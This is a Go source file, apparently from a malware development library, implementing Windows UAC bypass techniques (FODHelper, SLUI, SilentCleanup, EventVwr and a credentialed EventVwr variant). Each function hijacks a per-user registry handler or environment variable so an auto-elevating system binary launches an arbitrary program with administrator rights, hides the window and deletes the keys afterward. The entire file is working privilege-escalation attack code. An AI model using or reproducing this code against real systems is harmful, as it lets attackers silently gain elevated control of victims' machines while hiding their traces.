//go:build windows

// Package uacbypass implements UAC bypass techniques for Windows.
package uacbypass

import (
	"fmt"
	"os/exec"
	"runtime"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"

	"github.com/oioio-space/maldev/random"
	"github.com/oioio-space/maldev/win/api"
)

// FODHelper executes a program specified by path using the FODHelper UAC bypass.
// Only works on Windows 10 and later.
func FODHelper(path string) error {
	randKeyName, _ := random.RandomString(5)

	k, _, err := registry.CreateKey(
		registry.CURRENT_USER,
		`Software\Classes\`+randKeyName+`\shell\open\command`,
		registry.ALL_ACCESS,
	)
	if err != nil {
		return err
	}
	defer k.Close()
	defer registry.DeleteKey(
		registry.CURRENT_USER,
		`Software\Classes\`+randKeyName+`\shell\open\command`,
	)

	if err = k.SetStringValue("DelegateExecute", ""); err != nil {
		return err
	}
	if err = k.SetStringValue("", path); err != nil {
		return err
	}

	k2, _, err := registry.CreateKey(
		registry.CURRENT_USER,
		`Software\Classes\ms-settings\CurVer`,
		registry.ALL_ACCESS,
	)
	if err != nil {
		return err
	}
	defer k2.Close()
	defer registry.DeleteKey(
		registry.CURRENT_USER,
		`Software\Classes\ms-settings\CurVer`,
	)

	if err = k2.SetStringValue("", randKeyName); err != nil {
		return err
	}

	cmd := exec.Command("cmd.exe", "/C", "fodhelper.exe")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	return cmd.Run()
}

// SLUI executes a program specified by path using the SLUI UAC bypass.
func SLUI(path string) error {
	k, _, err := registry.CreateKey(
		registry.CURRENT_USER,
		`Software\Classes\exefile\shell\open\command`,
		registry.ALL_ACCESS,
	)
	if err != nil {
		return err
	}
	defer k.Close()
	defer registry.DeleteKey(
		registry.CURRENT_USER,
		`Software\Classes\exefile\shell\open\command`,
	)

	if err = k.SetStringValue("DelegateExecute", ""); err != nil {
		return err
	}
	if err = k.SetStringValue("", path); err != nil {
		return err
	}

	time.Sleep(time.Second)

	cmd := exec.Command("slui.exe")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	return cmd.Run()
}

// SilentCleanup executes a program specified by path using the SilentCleanup UAC bypass.
func SilentCleanup(path string) error {
	k, _, err := registry.CreateKey(
		registry.CURRENT_USER,
		"Environment",
		registry.SET_VALUE|registry.ALL_ACCESS,
	)
	if err != nil {
		return err
	}
	defer k.Close()

	cmdPath, err := exec.LookPath("cmd.exe")
	if err != nil {
		return err
	}

	if err = k.SetStringValue("windir", fmt.Sprintf("%s start /B %s", cmdPath, path)); err != nil {
		return err
	}
	defer k.DeleteValue("windir")

	time.Sleep(time.Second)

	cmd := exec.Command("schtasks.exe", "/RUN", "/TN", `\Microsoft\Windows\DiskCleanup\SilentCleanup`, "/I")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	return cmd.Run()
}

// EventVwr executes a program specified by path using the EventVwr UAC bypass.
func EventVwr(path string) error {
	k, _, err := registry.CreateKey(
		registry.CURRENT_USER,
		`Software\Classes\mscfile\shell\open\command`,
		registry.ALL_ACCESS,
	)
	if err != nil {
		return err
	}
	defer k.Close()
	defer registry.DeleteKey(
		registry.CURRENT_USER,
		`Software\Classes\mscfile\shell\open\command`,
	)

	cmdPath, err := exec.LookPath("cmd.exe")
	if err != nil {
		return err
	}

	if err = k.SetStringValue("", fmt.Sprintf("%s /C start %s", cmdPath, path)); err != nil {
		return err
	}

	// Registry writes are synchronous — launch eventvwr immediately.
	// eventvwr.exe reads HKCU\...\mscfile\shell\open\command on startup
	// and elevates the command without a UAC prompt.
	cmd := exec.Command("cmd.exe", "/C", "eventvwr.exe")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	return cmd.Run()
}

// EventVwrLogon executes a program specified by path using the EventVwr UAC bypass
// with alternate credentials via CreateProcessWithLogonW.
func EventVwrLogon(domain, user, password, path string) error {
	k, _, err := registry.CreateKey(
		registry.CURRENT_USER,
		`Software\Classes\mscfile\shell\open\command`,
		registry.ALL_ACCESS,
	)
	if err != nil {
		return err
	}
	defer k.Close()
	defer registry.DeleteKey(
		registry.CURRENT_USER,
		`Software\Classes\mscfile\shell\open\command`,
	)

	cmdPath, err := exec.LookPath("cmd.exe")
	if err != nil {
		return err
	}

	if err = k.SetStringValue("", fmt.Sprintf("%s /C start %s", cmdPath, path)); err != nil {
		return err
	}

	time.Sleep(time.Second)

	err = createProcessWithLogon(domain, user, password, `c:\`, "cmd.exe", "/C", "eventvwr.exe")
	return err
}

const logonWithProfile = 0x00000001

func createProcessWithLogon(domain, username, password, wd, path string, args ...string) error {
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	ptrUsername, err := windows.UTF16PtrFromString(username)
	if err != nil {
		return err
	}
	ptrDomain, err := windows.UTF16PtrFromString(domain)
	if err != nil {
		return err
	}
	ptrPassword, err := windows.UTF16PtrFromString(password)
	if err != nil {
		return err
	}
	ptrCD, err := windows.UTF16PtrFromString(wd)
	if err != nil {
		return err
	}
	ptrPath, err := windows.UTF16PtrFromString(path)
	if err != nil {
		return err
	}
	ptrCmdLine, err := windows.UTF16PtrFromString(windows.ComposeCommandLine(args))
	if err != nil {
		return err
	}

	creationFlags := uintptr(windows.CREATE_UNICODE_ENVIRONMENT) | uintptr(windows.CREATE_DEFAULT_ERROR_MODE)

	ptrStartupInfo := &windows.StartupInfo{
		ShowWindow: windows.SW_HIDE,
		Flags:      windows.STARTF_USESHOWWINDOW,
	}
	ptrProcessInfo := &windows.ProcessInformation{}

	ret, _, e1 := api.ProcCreateProcessWithLogonW.Call(
		uintptr(unsafe.Pointer(ptrUsername)),
		uintptr(unsafe.Pointer(ptrDomain)),
		uintptr(unsafe.Pointer(ptrPassword)),
		uintptr(logonWithProfile),
		uintptr(unsafe.Pointer(ptrPath)),
		uintptr(unsafe.Pointer(ptrCmdLine)),
		creationFlags,
		0,
		uintptr(unsafe.Pointer(ptrCD)),
		uintptr(unsafe.Pointer(ptrStartupInfo)),
		uintptr(unsafe.Pointer(ptrProcessInfo)),
	)

	runtime.KeepAlive(ptrUsername)
	runtime.KeepAlive(ptrDomain)
	runtime.KeepAlive(ptrPassword)
	runtime.KeepAlive(ptrPath)
	runtime.KeepAlive(ptrCmdLine)
	runtime.KeepAlive(ptrCD)
	runtime.KeepAlive(ptrStartupInfo)
	runtime.KeepAlive(ptrProcessInfo)

	if ret == 0 {
		return e1
	}

	windows.CloseHandle(windows.Handle(ptrProcessInfo.Process))
	windows.CloseHandle(windows.Handle(ptrProcessInfo.Thread))

	return nil
}
